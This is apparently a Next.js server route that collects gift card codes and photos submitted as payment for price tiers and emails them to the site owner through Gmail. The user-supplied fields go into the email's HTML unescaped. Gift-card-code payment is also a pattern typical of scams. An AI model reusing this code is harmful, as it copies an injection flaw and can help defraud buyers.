import nodemailer from "nodemailer";
import { NextResponse } from "next/server";

export async function POST(req) {
  try {
    const formData = await req.formData();
    const tier = formData.get("tier") || "Unknown";
    const price = formData.get("price") || "Unknown";
    const code = formData.get("code") || "No code provided";
    const image = formData.get("image");

    const attachments = [];
    if (image && image.size > 0) {
      const buffer = Buffer.from(await image.arrayBuffer());
      attachments.push({
        filename: image.name || "gift-card.jpg",
        content: buffer,
      });
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASSWORD,
      },
    });

    await transporter.sendMail({
      from: process.env.GMAIL_USER,
      to: process.env.GMAIL_USER,
      subject: `🎁 New Gift Card Submission — ${tier} ($${price})`,
      html: `
        <h2>New Gift Card Payment</h2>
        <p><strong>Tier:</strong> ${tier}</p>
        <p><strong>Price:</strong> $${price}</p>
        <p><strong>Gift Card Code:</strong> ${code}</p>
        <p><strong>Image Attached:</strong> ${attachments.length > 0 ? "Yes" : "No"}</p>
        <p><em>Submitted at ${new Date().toISOString()}</em></p>
      `,
      attachments,
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Gift submit error:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
